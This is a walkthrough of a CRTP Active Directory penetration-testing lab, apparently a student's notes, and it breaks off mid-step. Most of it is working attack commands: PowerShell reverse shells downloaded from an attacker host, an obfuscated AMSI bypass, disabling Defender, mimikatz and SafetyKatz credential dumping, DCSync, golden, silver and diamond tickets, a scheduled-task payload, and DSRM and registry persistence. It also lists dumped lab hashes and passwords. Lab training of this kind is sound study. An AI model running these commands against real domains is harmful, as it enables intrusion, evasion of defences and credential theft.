# CRTP Lab

Start by running Invishell to avoid being detected

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

### **FLAG 1 - SID of the member of the Enterprise Admins group**

Import powerView script

```powershell
. C:\AD\Tools\PowerView.ps1
```

Use the following command to get the SID of the domain users

```Powerview
Get-DomainGroupMember -Identity "Enterprise Admins"
```

But it doesn't return nothing because this computer is not in the root domain. So we need to query the root domain

```powerview
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

<figure><img src="../.gitbook/assets/Pasted image 20231018115633 (2).png" alt=""><figcaption></figcaption></figure>

### **FLAG 2 - Display name of the GPO applied on StudentMachines OU**

Task Enumerate following for the dollarcorp domain:

* List all the OUs
* List all the computers in the StudentMachines OU.
* List the GPOs
* Enumerate GPO applied on the StudentMachines OU. _List all the OUs_ Use the command

```powerview
Get-DomainOU
```

_List all the computers in the StudentMachines OU_ We can list all OUs names

```powerview
Get-DomainOU | select -ExpandProperty name
```

<figure><img src="../.gitbook/assets/Pasted image 20231018120557.png" alt=""><figcaption></figcaption></figure>

and select only the StudenMachines OU name

```PowerView
(Get-DomainOU -Identity StudentMachines).distinguishedname | 
%{Get-DomainComputer -SearchBase $_} | select name
```

_List the GPOs_ Use the command

```powerview
Get-DomainGPO
```

_Enumerate GPO applied on the StudentMachines OU_ Now copy the cn of the student machines with this command

```Powerview
(Get-DomainOU -Identity StudentMachines).gplink
```

<figure><img src="../.gitbook/assets/Pasted image 20231018121132.png" alt=""><figcaption></figcaption></figure>

and use it to retrieve the StudentMachines GPOs

```powerview
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'
```

<figure><img src="../.gitbook/assets/Pasted image 20231018121240.png" alt=""><figcaption></figcaption></figure>

### **FLAG 3 - ActiveDirectory Rights for RDPUsers group on the users named ControlxUser**

Enumerate following for the dollarcorp domain:

* ACL for the Domain Admins group
* All modify rights/permissions for the studentx _ACL for the Domain Admins group_ To get all ACLs

```PowerView
Get-DomainObjectAcl
```

To retrieve the ACLs for the Group admin group

```Powerview
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

_All modify rights/permissions for the studentx_ To find interesting ACLs for user student115 (me)

```powerview
Find-InterestingDomainAcl -ResolveGUIDs |  ?{$_.IdentityReferenceName -match "student115"}
```

To find interesting ACLs for RDPUsers group

```powerview
Find-InterestingDomainAcl -ResolveGUIDs |  ?{$_.IdentityReferenceName -match "RDPUsers"}
```

<figure><img src="../.gitbook/assets/Pasted image 20231018125919.png" alt=""><figcaption></figcaption></figure>

### **FLAG 4 - Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local**

* Enumerate all domains in the moneycorp.local forest.
* Map the trusts of the dollarcorp.moneycorp.local domain.
* Map External trusts in moneycorp.local forest.
* Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest? _Enumerate all domains in the moneycorp.local forest_ Use the next command

```PowerView
Get-ForestDomain
```

<figure><img src="../.gitbook/assets/Pasted image 20231018142754.png" alt=""><figcaption></figcaption></figure>

_Map the trusts of the dollarcorp.moneycorp.local domain_

```PowerView
Get-DomainTrust
```

<figure><img src="../.gitbook/assets/Pasted image 20231018130229 (2).png" alt=""><figcaption></figcaption></figure>

&#x20;_Map External trusts in moneycorp.local forest_ To list only the external trusts int the current forest

```Powerview
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

<figure><img src="../.gitbook/assets/Pasted image 20231018143331.png" alt=""><figcaption></figcaption></figure>

_Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?_

```Powerview
 Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

<figure><img src="../.gitbook/assets/Pasted image 20231018143757.png" alt=""><figcaption></figcaption></figure>

&#x20;enumerate trusts for eurocorp.local forest (Needed bi-directional or on way trust)

```Powerview
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```

<figure><img src="../.gitbook/assets/Pasted image 20231018144327.png" alt="" width="563"><figcaption></figcaption></figure>

### **FLAG 5/6/7/8 - Service Abuse/Lateral movement/Jenkins**

* Exploit a service on dcorp-studentx and elevate privileges to local administrator.
* Identify a machine in the domain where studentx has local administrative access.
* Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server. _Exploit a service on dcorp-studentx and elevate privileges to local administrator_ Import PowerUp.ps1

```powershell
. C:\AD\Tools\PowerUp.ps1
```

And launch the enumeration for possible privesc

```PowerUp
Invoke-AllChecks
```

<figure><img src="../.gitbook/assets/Pasted image 20231018145259.png" alt=""><figcaption></figcaption></figure>

&#x20;Abuse the service

```PowerUp
Invoke-ServiceAbuse -Name 'AbyssWebServer'
```

or to add ou user to the Local Administrator group

```PowerUp
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student115' -Verbose
```

<figure><img src="../.gitbook/assets/Pasted image 20231018145807.png" alt=""><figcaption></figcaption></figure>

_Identify a machine in the domain where studentx has local administrative access._

```powershell
. .\Find-PSremotingLocalAdminAccess.ps1
```

```powershell
Find-PSremotingLocalAdminAccess -verbose
```

<figure><img src="../.gitbook/assets/Pasted image 20231018151010.png" alt=""><figcaption></figcaption></figure>

Connect to the machine found

```powershell
winrs -r:dcorp-adminsrv cmd
```

_Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server_ If we go to the “People” page of Jenkins we can see the users present on the Jenkins instance. Since Jenkins does not have a password policy many users use username as passwords even on the publicly available instances. In this case `builduser:builduser` Use the modified version of invoke-powershelltcp.ps1 and download with jenkins to run it as the user running jenkils

```powershell
powershell.exe iex (iwr http://172.16.100.115/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.99.115 -Port 443
```

<figure><img src="../.gitbook/assets/Pasted image 20231018153601.png" alt=""><figcaption></figcaption></figure>

### **FLAG 9 - Collection method in BloodHound that covers all the collection methods**

Launch sharpound on the student vm and export it to kali to use bloodhound

### FLAG 10/11/12/13/14/15 - svcadmin/NTLM&#x20;

* Identify a machine in the target domain where a Domain Admin session is available.
* Compromise the machine and escalate privileges to Domain Admin
  * Using access to dcorp-ci
  * Using derivative local admin _Identify a machine in the target domain where a Domain Admin session is available_ First bypass the Enhanced Script Block Logging on the reverse shell

```powershell
iex (iwr http://172.16.100.115/sbloggingbypass.txt -UseBasicParsing)
```

To bypass the AMSI

```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Now download powerview on the reverse shell to enumerate the machines where the domain admin is logged in

```powershell
iex ((New-Object Net.WebClient).DownloadString('http://172.16.99.115/PowerView.ps1'))
```

launch the command

```powerview
Find-DomainUserLocation
```

<figure><img src="../.gitbook/assets/Pasted image 20231018164427.png" alt=""><figcaption></figcaption></figure>

Connect using winrs

```powershell
winrs -r:dcorp-mgmt whoami
```

<figure><img src="../.gitbook/assets/Pasted image 20231018164816.png" alt=""><figcaption></figcaption></figure>

_Abuse using winrs_ To extract credentials from the machine we could run safetykatz. To do that we should copy loader.exe on the machine.

```powershell
iwr http://172.16.100.115/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

To avoid detection while download safetykatz add a portforwarding on the remote machine

```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115"
```

Launch safety katz

```Powershell
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

<figure><img src="../.gitbook/assets/Pasted image 20231019104347.png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
The file transfer works only if file is hosted inside the network&#x20;
{% endhint %}

we get svcadmin aes256\_hmac, rc4\_hmac\_nt and password on DCORP-mngmt

***

#### Second Method - Abusing PS-Remoting Download Invoke-Mimi

```powershell
iex (iwr http://172.16.100.115/Invoke-Mimi.ps1 -UseBasicParsing)
```

Create a session with pssession

```powershell
 $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```

Disable AMSI on the remote machine

```powershell
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

Run invoke-mimi

```powershell
Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
```

`DCORP-DC svcadmin creds`

| Type          | Hash                                                             |
| ------------- | ---------------------------------------------------------------- |
| Password      | \*ThisisBlasphemyThisisMadness!!                                 |
| aes256\_hmac  | 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 |
| rc4\_hmac\_nt | b38ff50264b74508085d82c69794a4d8                                 |

Finally we can use the OverPass-the-Hash technique to access on dcorp-dc

```cmd
Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

{% hint style="warning" %}
With cmd and elevated priviledges
{% endhint %}

Use winrs to test

```powershell
winrs -r:dcorp-dc whoami
```

<figure><img src="../.gitbook/assets/Pasted image 20231019111546.png" alt=""><figcaption></figcaption></figure>

_Derivative Local Admin_ To to user hunting with our priviledge user "Student115"

```powershell
. .\Find-PSRemotingLocalAdminAccess.ps1
```

and the command

```powershell
Find-PSRemotingLocalAdminAccess
```

<figure><img src="../.gitbook/assets/Pasted image 20231019125319.png" alt=""><figcaption></figcaption></figure>

We have local admin on the dcorp-adminsrv. To look if there are some restriction on the app we can run check for "applocker"

```powershell
winrs -r:dcorp-adminsrv cmd
```

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

is configured. After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20231019143148.png" alt=""><figcaption></figcaption></figure>

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d2
```

<figure><img src="../.gitbook/assets/Pasted image 20231019143331.png" alt=""><figcaption></figcaption></figure>

We can also confirm this by using the user dcorp-adminsrv

```powershell
enter-PSSession dcorp-adminsrv
```

```powershell
$ExecutionContext.SessionState.LanguageMode
```

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

So we can run program on the directory C:/Program Files/. Firstly we disabile de AV

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

We cannot use the dot sourcing, so we need to use a script that run mimikatz by itself

```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

```powershell
.\Invoke-MimiEx.ps1
```

`appadmin - DCORP-DC`

| Type          | Hash                                                             |
| ------------- | ---------------------------------------------------------------- |
| Password      | \*ActuallyTheWebServer1                                          |
| aes256\_hmac  | 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb |
| rc4\_hmac\_nt | d549831a955fee51a43c83efb3928fa7                                 |

`srvadmin - DCORP-DC`

| Type          | Hash                                                             |
| ------------- | ---------------------------------------------------------------- |
| Password      | null                                                             |
| aes256\_hmac  | 145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 |
| rc4\_hmac\_nt | a98e18228819e8eec3dfa33cb68b0728                                 |

`websvc- DCORP-DC`

| Type          | Hash                                                             |
| ------------- | ---------------------------------------------------------------- |
| Password      | AServicewhichIsNotM3@nttoBe                                      |
| aes256\_hmac  | 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 |
| rc4\_hmac\_nt | cc098f204c5887eaa8253e7c2749156f                                 |

`dcorp-adminsrv$- DCORP-ADMINSRV`

| Type          | Hash                                                             |
| ------------- | ---------------------------------------------------------------- |
| Password      | null                                                             |
| aes256\_hmac  | e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 |
| rc4\_hmac\_nt | b5f451985fd34d58d5120816d31b5565                                 |

### **FLAG 16/17 - hash krbgt/ hash domain administrator**

* Extract secrets from the domain controller of dollarcorp.
* Using the secrets of krbtgt account, create a Golden ticket.
* Use the Golden ticket to (once again) get domain admin privileges from a machine. _Extract secrets from the domain controller of dollarcorp_ Now that we had extracted a domain admin's hash we can dump the secrets from a domain controller First we get a session on the controller

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Copy the loader on the dc and use the port forwarding technique to use mimikatz and extract all creds

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

```powershell
winrs -r:dcorp-dc cmd
```

```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115
```

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

```mimikatz
lsadump::lsa /patch
```

<figure><img src="../.gitbook/assets/Pasted image 20231023111808.png" alt=""><figcaption></figcaption></figure>

or

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

`Administrator- DCORP-DC`

| Type     | Hash                             |
| -------- | -------------------------------- |
| Password | null                             |
| NTLM     | af0686cc0ca8f04df42210c9ac980760 |

`krbtgt - DCORP-DC`

| Type         | Hash                                                             |
| ------------ | ---------------------------------------------------------------- |
| Password     | null                                                             |
| NTLM         | 4e9815869d2090ccfca61c1fe0d23986                                 |
| aes256\_hmac | 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 |

`sqladmin - DCORP-DC`

| Type     | Hash                             |
| -------- | -------------------------------- |
| Password | null                             |
| NTLM     | 07e8be316e3da9a042a9cb681df19bf5 |

`dcorp-dc$ - DCORP-DC`

<table><thead><tr><th width="198">Type</th><th>Hash</th></tr></thead><tbody><tr><td>Password</td><td>null</td></tr><tr><td>NTLM</td><td>1698fafb9170e4798e43b77ac38cf0bf</td></tr><tr><td>aes256_hmac</td><td>5a056ff3f077232cfa8fee8d7054abb72f99f3c5a04bb46b6c6ae01964414d19</td></tr></tbody></table>

_Using the secrets of krbtgt account, create a Golden ticket_ Just use BetterSafetyKatz

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

<figure><img src="../.gitbook/assets/Pasted image 20231023113432.png" alt=""><figcaption></figcaption></figure>

To check if we succesfully got the golden ticket

```powershell
klist
```

<figure><img src="../.gitbook/assets/Pasted image 20231023113613.png" alt=""><figcaption></figcaption></figure>

### **FLAG 18 - The service whose Silver Ticket can be used for scheduling tasks**

Try to get command execution on the domain controller by creating silver ticket for:

* HOST service
* WMI

_HOST service_ Create the golden ticket

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-19815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /aes256:5a056ff3f077232cfa8fee8d7054abb72f99f3c5a04bb46b6c6ae01964414d19 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

Modify Invoke-PowerShellTcp.ps1. Paste and the end of the file the following line

```
Power -Reverse -IPAddress 172.16.100.115 -Port 443
```

And launch this command to inject a shedule task on the host and gain a reverse shell

```powershell
schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "User115" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.115/Invoke-PowerShellTcpEx.ps1''')'"
```

### **FLAG 19 - Name of the account who secrets are used for the Diamond Ticket attack**

* Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack Use Rubeus and the krbtgt credentials to create a Diamond Ticket

```Cmd
C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

and now you can user win-rs to execute commands

### **FLAG 20 - Name of the Registry key modified to change Logon behavior of DSRM administrator**

To persistence on dcorp-dc we can abuse the DSRM service. Firtsly dump the hashes from the dc Open a session on the dc

```powershell
. C:\AD\Tools\Invoke-Mimi.ps1
```

```powershell
Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd.exe"'
```

or using Rubeus

```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Launch Invishell e establish the session

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
$sess = New-PSSession dcorp-dc
```

Bypass the AMSI

```powershell
Enter-PSSession -Session $sess
```

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

```powershell
exit
```

Load and launch Invoke-Mimi

```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
```

```powershell
Enter-PSSession -Session $sess
```

```powershell
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
```

<figure><img src="../.gitbook/assets/Pasted image 20231025114637.png" alt=""><figcaption></figcaption></figure>

&#x20;`Local built-in Administrator -dcorp-dc`

| Type         | Hash                             |
| ------------ | -------------------------------- |
| Password     | null                             |
| NTLM         | a102ad5753f4c441e3af31c97fad86fd |
| aes256\_hmac | null                             |

The DSRM administrator is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC

```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

<figure><img src="../.gitbook/assets/Pasted image 20231025115059 (1).png" alt=""><figcaption></figcaption></figure>

Now from the attack box we can simply pas the hash and use the dsrm administrator session

```powershell
Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

```powershell
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

<figure><img src="../.gitbook/assets/Pasted image 20231025115506.png" alt=""><figcaption></figcaption></figure>

### **FLAG 21 - Attack that can be executed with Replication rights (no DA privileges required)**

* Check if studentx has Replication (DCSync) rights.
* If yes, execute the DCSync attack to pull hashes of the krbtgt user.
* If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user _Check if studentx has Replication (DCSync) rights._ We can check with this command

```powershell
. C:\AD\Tools\PowerView.ps1
```

```powerview
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student115"}
```

It doesn't return nothing, so we don't have priviledge _add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user_ Create a session with a domain admin

```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Run invishell and import powerview

```cmd
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tools\PowerView.ps1
```

add the permission to student115

```powerview
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student115 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../.gitbook/assets/Pasted image 20231025125006.png" alt=""><figcaption></figcaption></figure>

_execute the DCSync attack to pull hashes of the krbtgt user_ Now use safetykatz to extract the hash of any user

&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20231025125252.png" alt=""><figcaption></figcaption></figure>

Let's check if now we have the permissions (use the previous command)

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

<figure><img src="../.gitbook/assets/Pasted image 20231025125418.png" alt=""><figcaption></figcaption></figure>

### **FLAG 22 - SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace.**

* Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
* Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI. _Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access_ Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges. Open a session with invoke-mimi or rubeus and launch invishell. import the RACE.ps1 module

```powershell
. C:\AD\Tools\RACE.ps1
```

And modify the service

```powershell
Set-RemoteWMI -SamAccountName student115 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

<figure><img src="../.gitbook/assets/Pasted image 20231025144401 (1).png" alt=""><figcaption></figcaption></figure>

ow we granted the acces to us

```powershell
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../.gitbook/assets/Pasted image 20231025144606 (1).png" alt=""><figcaption></figcaption></figure>

***

We can do the same but with powershell. After opened the session and imported

```powershell
. C:\AD\Tools\RACE.ps1
```

```powershell
Set-RemotePSRemoting -SamAccountName student115 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

To check if the command worked

```powershell
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

<figure><img src="../.gitbook/assets/Pasted image 20231025145545 (1).png" alt=""><figcaption></figcaption></figure>

_Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI_ To retrieve access without Domain admin access we need to modify a permission on the dc So open a session, import race.ps1 and launche te command.

```powershell
. C:\AD\Tools\RACE.ps1
```

```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student115 -Verbose
```

<figure><img src="../.gitbook/assets/Pasted image 20231025150802 (1).png" alt=""><figcaption></figcaption></figure>

and retrieve the hash

```powershell
. C:\AD\Tools\RACE.ps1
```

```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

<figure><img src="../.gitbook/assets/Pasted image 20231025150902 (1).png" alt=""><figcaption></figcaption></figure>

and with that we can create a silver ticket for the services (in this case HOST)

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1698fafb9170e4798e43b77ac38cf0bf /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

### **FLAG 23 - SPN for which a TGS is requested**

* Using the Kerberoast attack, crack password of a SQL server service account. Import powerview and use it to search for spn accounts

```powerview
Get-DomainUser -SPN
```

<figure><img src="../.gitbook/assets/Pasted image 20231025153253.png" alt=""><figcaption></figcaption></figure>

We try to kerberoast it

```cmd
C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

<figure><img src="../.gitbook/assets/Pasted image 20231025154546.png" alt=""><figcaption></figcaption></figure>

Crack it with john

```cmd
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

### **FLAG 24/25 - Domain user who is a local admin on dcorp-appsrv**

* Find a server in the dcorp domain where Unconstrained Delegation is enabled.
* Compromise the server and escalate to Domain Admin privileges.
* Escalate to Enterprise Admins privileges by abusing Printer Bug! _Find a server in the dcorp domain where Unconstrained Delegation is enabled._ Using powerview we can look for unconstrained delegation server

```powerview
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

<figure><img src="../.gitbook/assets/Pasted image 20231025161708.png" alt=""><figcaption></figcaption></figure>

Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. We already pwned on of those user (appadmin) _Compromise the server and escalate to Domain Admin privileges_ We can try with the user already found gain a session on this server

```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"
```

One we are logged in we can launch invishell. Import the Find-PSRemotingLocalAdminAccess.ps1 module to see if we can log in the server

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```powershell
Find-PSRemotingLocalAdminAccess
```

<figure><img src="../.gitbook/assets/Pasted image 20231025162212.png" alt=""><figcaption></figcaption></figure>

Use rubeus on the server to run on listener mode

```powershell
echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\C$\Users\Public\Rubeus.exe /Y
```

log in the server

```powershell
winrs -r:dcorp-appsrv cmd
```

Launch rubeus

```powershell
C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

<figure><img src="../.gitbook/assets/Pasted image 20231025163953.png" alt=""><figcaption></figcaption></figure>

Now use MS-RPRN to force authentication from dcorp-dc$(Machine account)

```powershell
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

Rubeus is triggered&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20231025164204.png" alt=""><figcaption></figcaption></figure>

Copy the ticket and use it with rubeus on the local machine

```powershell
